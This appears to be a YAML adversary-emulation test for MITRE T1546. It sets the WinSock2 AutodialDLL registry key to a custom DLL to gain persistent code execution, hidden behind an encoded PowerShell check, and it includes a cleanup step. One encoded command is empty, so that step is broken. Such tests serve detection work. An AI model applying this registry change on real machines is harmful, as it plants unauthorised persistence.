- requirements: []
  name: Soumaia ART Tests - Persistence with Custom AutodialDLL
  description: "The DLL pointed to by the AutodialDLL registry key is loaded every time a process connects to the internet. Attackers can gain persistent code execution by setting this key to a DLL of their choice. \n\nThe sample dll provided, AltWinSock2DLL, will launch the notepad process. Starting and stopping a web browser such as MS Edge or Chrome should result in the dll executing.\n[Blog](https://www.mdsec.co.uk/2022/10/autodialdlling-your-way/) (requires elevation)"
  tactic: privilege-escalation
  technique_id: T1546
  technique_name: Event Triggered Execution
  executors:
  - cleanup:
    - Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters -Name AutodialDLL -Value  $env:windir\system32\rasadhlp.dll
    timeout: 60
    platform: windows
    name: psh
    payloads:
    - AltWinSock2DLL.dll
    - bin
    parsers: []
    command: powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgAC4AXABBAGwAdABXAGkAbgBTAG8AYwBrADIARABMAEwALgBkAGwAbAApACAAewAgAGUAeABpAHQAIAAwAH0AIABlAGwAcwBlACAAewAgAGUAeABpAHQAIAAxAH0ACgA=; if ($LASTEXITCODE -ne 0) { powershell -NoProfile -EncodedCommand  }; Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters -Name AutodialDLL -Value .\AltWinSock2DLL.dll
  id: b652b133-cf10-5709-a7b9-d1283c5274d7
